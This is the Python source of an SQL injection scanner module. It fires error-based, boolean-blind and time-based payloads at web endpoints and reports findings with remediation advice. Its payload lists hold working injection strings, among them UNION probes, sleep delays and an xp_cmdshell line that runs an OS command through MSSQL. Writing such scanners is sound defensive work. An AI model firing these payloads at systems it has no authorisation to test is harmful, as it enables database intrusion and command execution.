"""
scanner/sqli.py
===============
SQL Injection Scanner — detects blind, error-based, time-based,
and UNION-based SQL injection vulnerabilities.
"""

import asyncio
import re
import time
from typing import List, Optional
from loguru import logger

from core.models import Vulnerability, VulnType, Severity, Endpoint, HttpMethod, AttackVector
from core.config import ScanConfig
from core.session import ScanSession


class SQLiScanner:
    """
    SQL Injection detection using:
    - Error-based detection (database error signatures)
    - Boolean-based blind detection (response length/content differences)
    - Time-based blind detection (sleep() / WAITFOR DELAY)
    - UNION-based detection
    """

    # Error signatures per database engine
    ERROR_SIGNATURES = {
        "MySQL":      [r"you have an error in your sql syntax",
                       r"warning: mysql", r"mysql_fetch",
                       r"supplied argument is not a valid mysql"],
        "PostgreSQL": [r"pg_query\(\)", r"pg_exec\(\)",
                       r"postgresql.*error", r"warning.*pg_"],
        "MSSQL":      [r"unclosed quotation mark",
                       r"incorrect syntax near", r"sqlserver",
                       r"microsoft.*sql.*server"],
        "Oracle":     [r"oracle.*driver", r"quoted string not properly terminated",
                       r"ora-\d{5}"],
        "SQLite":     [r"sqlite_", r"sqlite3.", r"near.*syntax error"],
        "Generic":    [r"sql syntax", r"syntax error", r"mysql error",
                       r"query failed", r"database error"],
    }

    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR "1"="1',
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 999--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1; SELECT SLEEP(1)--",
        "'; EXEC xp_cmdshell('dir')--",
    ]

    # Boolean-based payloads (true/false pair)
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        (" AND 1=1", " AND 1=2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("1) AND (1=1", "1) AND (1=2"),
    ]

    # Time-based payloads (MySQL, MSSQL, PostgreSQL)
    TIME_PAYLOADS = [
        "' AND SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' AND pg_sleep(3)--",
        "1; SELECT pg_sleep(3)--",
        "' OR SLEEP(3)#",
    ]

    TIME_THRESHOLD = 2.5  # seconds

    def __init__(self, session: ScanSession, config: ScanConfig):
        self.session = session
        self.config = config
        self.vulnerabilities: List[Vulnerability] = []

    async def scan(
        self, endpoints: List[Endpoint], attack_vectors: List[AttackVector]
    ) -> List[Vulnerability]:
        """Run SQL injection tests against all relevant endpoints."""
        self.vulnerabilities = []

        # Filter endpoints that have parameters (more likely to be injectable)
        injectable = [e for e in endpoints if e.params or e.forms]
        logger.info(f"[SQLi] Testing {len(injectable)} parameterized endpoints")

        tasks = [self._test_endpoint(endpoint) for endpoint in injectable[:50]]
        await asyncio.gather(*tasks, return_exceptions=True)

        logger.info(f"[SQLi] Found {len(self.vulnerabilities)} SQL injection vulnerabilities")
        return self.vulnerabilities

    async def _test_endpoint(self, endpoint: Endpoint):
        """Test a single endpoint for SQL injection."""
        all_params = dict(endpoint.params)

        # Also extract form inputs
        for form in endpoint.forms:
            all_params.update(form.get("inputs", {}))

        for param_name in all_params:
            await asyncio.gather(
                self._test_error_based(endpoint, param_name),
                self._test_time_based(endpoint, param_name),
            )
            # Stop if we already found a vuln in this param
            already_found = any(
                v.url == endpoint.url and v.parameter == param_name
                for v in self.vulnerabilities
            )
            if not already_found:
                await self._test_boolean_based(endpoint, param_name)

    async def _test_error_based(self, endpoint: Endpoint, param: str):
        """Test for error-based SQL injection."""
        original_params = dict(endpoint.params)

        for payload in self.ERROR_PAYLOADS[:6]:
            test_params = dict(original_params)
            test_params[param] = payload

            try:
                if endpoint.method == HttpMethod.GET:
                    resp = await self.session.get(endpoint.url, params=test_params)
                else:
                    resp = await self.session.post(endpoint.url, data=test_params)

                if not resp:
                    continue

                body = (await resp.text(errors="ignore")).lower()

                for db_name, patterns in self.ERROR_SIGNATURES.items():
                    for pattern in patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            vuln = self._create_vuln(
                                endpoint=endpoint,
                                param=param,
                                payload=payload,
                                technique="Error-Based",
                                db_engine=db_name,
                                evidence=f"Database error signature detected: '{pattern}'",
                                severity=Severity.CRITICAL,
                                confidence=0.95,
                            )
                            self.vulnerabilities.append(vuln)
                            logger.warning(
                                f"[SQLi] CRITICAL Error-based SQLi @ {endpoint.url} "
                                f"param={param} payload={payload!r}"
                            )
                            return

            except Exception as e:
                logger.debug(f"[SQLi] Error testing {endpoint.url}: {e}")

    async def _test_boolean_based(self, endpoint: Endpoint, param: str):
        """Test for boolean-based blind SQL injection."""
        original_params = dict(endpoint.params)

        # Get baseline response
        try:
            if endpoint.method == HttpMethod.GET:
                baseline_resp = await self.session.get(endpoint.url, params=original_params)
            else:
                baseline_resp = await self.session.post(endpoint.url, data=original_params)
            if not baseline_resp:
                return
            baseline_len = len(await baseline_resp.text(errors="ignore"))
        except Exception:
            return

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS[:3]:
            try:
                # Test TRUE condition
                true_params = dict(original_params)
                true_params[param] = str(original_params.get(param, "1")) + true_payload
                if endpoint.method == HttpMethod.GET:
                    true_resp = await self.session.get(endpoint.url, params=true_params)
                else:
                    true_resp = await self.session.post(endpoint.url, data=true_params)

                # Test FALSE condition
                false_params = dict(original_params)
                false_params[param] = str(original_params.get(param, "1")) + false_payload
                if endpoint.method == HttpMethod.GET:
                    false_resp = await self.session.get(endpoint.url, params=false_params)
                else:
                    false_resp = await self.session.post(endpoint.url, data=false_params)

                if not true_resp or not false_resp:
                    continue

                true_body = await true_resp.text(errors="ignore")
                false_body = await false_resp.text(errors="ignore")
                true_len = len(true_body)
                false_len = len(false_body)

                # Significant difference between TRUE and FALSE responses
                diff = abs(true_len - false_len)
                if diff > 50 and true_len != baseline_len:
                    vuln = self._create_vuln(
                        endpoint=endpoint,
                        param=param,
                        payload=true_payload,
                        technique="Boolean-Based Blind",
                        evidence=f"Response length differs: TRUE={true_len}, FALSE={false_len} (diff={diff})",
                        severity=Severity.HIGH,
                        confidence=0.75,
                    )
                    self.vulnerabilities.append(vuln)
                    logger.warning(f"[SQLi] HIGH Boolean-based SQLi @ {endpoint.url} param={param}")
                    return

            except Exception as e:
                logger.debug(f"[SQLi] Boolean test error: {e}")

    async def _test_time_based(self, endpoint: Endpoint, param: str):
        """Test for time-based blind SQL injection using sleep payloads."""
        original_params = dict(endpoint.params)

        for payload in self.TIME_PAYLOADS[:3]:
            test_params = dict(original_params)
            test_params[param] = str(original_params.get(param, "1")) + payload

            try:
                start = time.monotonic()
                if endpoint.method == HttpMethod.GET:
                    resp = await self.session.get(endpoint.url, params=test_params)
                else:
                    resp = await self.session.post(endpoint.url, data=test_params)
                elapsed = time.monotonic() - start

                if elapsed >= self.TIME_THRESHOLD:
                    vuln = self._create_vuln(
                        endpoint=endpoint,
                        param=param,
                        payload=payload,
                        technique="Time-Based Blind",
                        evidence=f"Response delayed by {elapsed:.2f}s (threshold={self.TIME_THRESHOLD}s)",
                        severity=Severity.HIGH,
                        confidence=0.80,
                    )
                    self.vulnerabilities.append(vuln)
                    logger.warning(
                        f"[SQLi] HIGH Time-based SQLi @ {endpoint.url} "
                        f"param={param} delay={elapsed:.2f}s"
                    )
                    return

            except asyncio.TimeoutError:
                # Timeout might indicate successful sleep
                vuln = self._create_vuln(
                    endpoint=endpoint,
                    param=param,
                    payload=payload,
                    technique="Time-Based Blind (Timeout)",
                    evidence="Request timed out after sleep payload — likely vulnerable",
                    severity=Severity.HIGH,
                    confidence=0.70,
                )
                self.vulnerabilities.append(vuln)
                return
            except Exception:
                pass

    def _create_vuln(
        self,
        endpoint: Endpoint,
        param: str,
        payload: str,
        technique: str,
        evidence: str,
        severity: Severity,
        confidence: float,
        db_engine: str = "Unknown",
    ) -> Vulnerability:
        return Vulnerability(
            vuln_type=VulnType.SQLI,
            severity=severity,
            title=f"SQL Injection ({technique}) in parameter '{param}'",
            description=(
                f"A SQL injection vulnerability was detected using {technique} technique "
                f"on parameter '{param}'. The backend database ({db_engine}) processes "
                f"unsanitized user input, allowing an attacker to read, modify, or delete "
                f"database contents."
            ),
            url=endpoint.url,
            method=endpoint.method,
            parameter=param,
            payload=payload,
            evidence=evidence,
            confidence=confidence,
            remediation=(
                "1. Use parameterized queries / prepared statements.\n"
                "2. Implement input validation and whitelisting.\n"
                "3. Apply principle of least privilege on DB accounts.\n"
                "4. Enable WAF with SQLi rules.\n"
                "5. Use ORM frameworks that handle escaping automatically."
            ),
            cwe_id="CWE-89",
            owasp_category="A03:2021 – Injection",
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            ],
        )
